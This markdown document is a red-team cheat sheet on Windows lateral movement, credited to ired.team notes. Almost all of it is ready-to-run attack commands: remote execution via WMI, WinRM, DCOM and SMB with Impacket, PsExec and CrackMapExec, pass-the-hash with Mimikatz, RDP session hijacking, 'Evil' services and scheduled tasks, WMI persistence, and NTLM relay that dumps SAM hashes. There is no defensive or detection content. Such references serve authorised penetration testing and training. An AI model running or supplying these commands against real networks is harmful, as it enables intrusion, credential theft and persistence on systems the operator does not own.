# Lateral Movement Techniques

## Overview
Lateral movement enables attackers to expand access across a network after initial compromise. Techniques leverage Windows protocols like WMI, WinRM, DCOM, SMB, and RDP.

*Source: Based on ired.team red team notes*

---

## WMI (Windows Management Instrumentation)

### Remote Process Creation
```powershell
# PowerShell
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt"

# wmic command
wmic /node:TARGET process call create "cmd.exe /c whoami > C:\temp\out.txt"

# With credentials
wmic /node:TARGET /user:DOMAIN\user /password:pass process call create "powershell -enc BASE64"
```

### Impacket wmiexec
```bash
# Interactive shell
wmiexec.py domain/user:password@TARGET

# Single command
wmiexec.py domain/user:password@TARGET "whoami"

# Pass-the-hash
wmiexec.py -hashes :NTHASH domain/user@TARGET
```

### WMI Event Subscription (Persistence + Lateral)
```powershell
# Create event filter
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "EvilFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"
}

# Create consumer
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "EvilConsumer"
    CommandLineTemplate = "cmd.exe /c calc.exe"
}

# Bind them
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

---

## WinRM / PowerShell Remoting

### Enable WinRM
```powershell
# Enable on target (requires admin)
Enable-PSRemoting -Force

# Check status
Test-WSMan TARGET
```

### Remote Execution
```powershell
# Interactive session
Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)

# Execute command
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }

# Execute script
Invoke-Command -ComputerName TARGET -FilePath C:\script.ps1

# Multiple targets
Invoke-Command -ComputerName TARGET1,TARGET2,TARGET3 -ScriptBlock { hostname }
```

### Evil-WinRM
```bash
# Password auth
evil-winrm -i TARGET -u user -p password

# Pass-the-hash
evil-winrm -i TARGET -u user -H NTHASH

# With SSL
evil-winrm -i TARGET -u user -p password -S
```

### WinRS (Windows Remote Shell)
```cmd
winrs -r:TARGET -u:DOMAIN\user -p:password "cmd.exe /c whoami"
winrs -r:TARGET "hostname"
```

---

## DCOM (Distributed Component Object Model)

### MMC20.Application
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")
```

### ShellWindows
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
```

### ShellBrowserWindow
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "TARGET"))
$com.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\temp\out.txt", "", $null, 0)
```

### Impacket dcomexec
```bash
dcomexec.py domain/user:password@TARGET "whoami"
dcomexec.py -hashes :NTHASH domain/user@TARGET "hostname"
```

---

## SMB-Based Movement

### PsExec
```bash
# Impacket
psexec.py domain/user:password@TARGET
psexec.py -hashes :NTHASH domain/user@TARGET

# Sysinternals
psexec.exe \\TARGET -u DOMAIN\user -p password cmd.exe
psexec.exe \\TARGET -s cmd.exe  # Run as SYSTEM
```

### SMBExec (No File Drop)
```bash
smbexec.py domain/user:password@TARGET
smbexec.py -hashes :NTHASH domain/user@TARGET
```

### ATExec (Scheduled Task)
```bash
atexec.py domain/user:password@TARGET "whoami"
atexec.py -hashes :NTHASH domain/user@TARGET "hostname"
```

### CrackMapExec
```bash
# Execute command
crackmapexec smb TARGET -u user -p password -x "whoami"

# Execute PowerShell
crackmapexec smb TARGET -u user -p password -X "Get-Process"

# Multiple targets
crackmapexec smb 192.168.1.0/24 -u user -p password -x "hostname"

# Pass-the-hash
crackmapexec smb TARGET -u user -H NTHASH -x "whoami"
```

---

## RDP (Remote Desktop)

### RDP Hijacking (tscon)
Hijack existing sessions without credentials (requires SYSTEM).

```cmd
# List sessions
query user

# Hijack session (as SYSTEM)
tscon <SESSION_ID> /dest:console

# Create service to get SYSTEM
sc create sesshijack binpath= "cmd.exe /k tscon 2 /dest:console"
net start sesshijack
```

### SharpRDP (Headless RDP)
```powershell
SharpRDP.exe computername=TARGET command="cmd.exe /c whoami" username=DOMAIN\user password=password
```

### xfreerdp
```bash
# Standard connection
xfreerdp /v:TARGET /u:user /p:password

# Pass-the-hash
xfreerdp /v:TARGET /u:user /pth:NTHASH

# Network Level Authentication disabled
xfreerdp /v:TARGET /u:user /p:password /sec:tls
```

---

## Service-Based Movement

### Remote Service Creation
```cmd
# Create and start remote service
sc \\TARGET create evilsvc binpath= "cmd.exe /c whoami > C:\temp\out.txt"
sc \\TARGET start evilsvc
sc \\TARGET delete evilsvc
```

### Impacket services
```bash
services.py domain/user:password@TARGET create -name evilsvc -display "Evil Service" -path "cmd.exe /c whoami"
services.py domain/user:password@TARGET start -name evilsvc
```

---

## Scheduled Tasks

### Remote Task Creation
```cmd
# Create task
schtasks /create /s TARGET /u DOMAIN\user /p password /tn "EvilTask" /tr "cmd.exe /c whoami > C:\temp\out.txt" /sc once /st 00:00

# Run immediately
schtasks /run /s TARGET /tn "EvilTask"

# Delete task
schtasks /delete /s TARGET /tn "EvilTask" /f
```

### PowerShell
```powershell
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\temp\out.txt"
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
Register-ScheduledTask -TaskName "EvilTask" -Action $Action -Trigger $Trigger -CimSession TARGET
```

---

## SMB Relay Attacks

### Responder + ntlmrelayx
```bash
# Start Responder (capture mode)
responder -I eth0 -wrf

# Start relay
ntlmrelayx.py -tf targets.txt -smb2support

# Execute command on relay
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Dump SAM
ntlmrelayx.py -tf targets.txt -smb2support --sam
```

### Check for SMB Signing
```bash
# Nmap
nmap --script smb-security-mode -p445 TARGET

# CrackMapExec
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
```

---

## SSH Tunneling

### Local Port Forwarding
```bash
# Forward local port to remote
ssh -L 8080:internal-target:80 user@jumpbox

# Access internal-target:80 via localhost:8080
```

### Remote Port Forwarding
```bash
# Forward remote port back to attacker
ssh -R 8080:localhost:80 user@jumpbox

# Remote users access jumpbox:8080, traffic sent to attacker:80
```

### Dynamic SOCKS Proxy
```bash
# Create SOCKS proxy
ssh -D 9050 user@jumpbox

# Use with proxychains
proxychains nmap -sT internal-target
```

---

## Pass-the-Hash

```bash
# Impacket tools
psexec.py -hashes :NTHASH domain/user@TARGET
wmiexec.py -hashes :NTHASH domain/user@TARGET
smbexec.py -hashes :NTHASH domain/user@TARGET

# Mimikatz
mimikatz# sekurlsa::pth /user:user /domain:domain.local /ntlm:NTHASH /run:cmd.exe

# CrackMapExec
crackmapexec smb TARGET -u user -H NTHASH -x "whoami"

# Evil-WinRM
evil-winrm -i TARGET -u user -H NTHASH
```

---

## Tools Reference

| Tool | Protocol | Notes |
|------|----------|-------|
| wmiexec.py | WMI | Semi-interactive shell |
| psexec.py | SMB | Drops binary, full shell |
| smbexec.py | SMB | No binary drop |
| atexec.py | SMB+Task | Scheduled task execution |
| dcomexec.py | DCOM | Multiple DCOM objects |
| evil-winrm | WinRM | Feature-rich shell |
| CrackMapExec | Multi | Swiss army knife |
| SharpRDP | RDP | Headless execution |
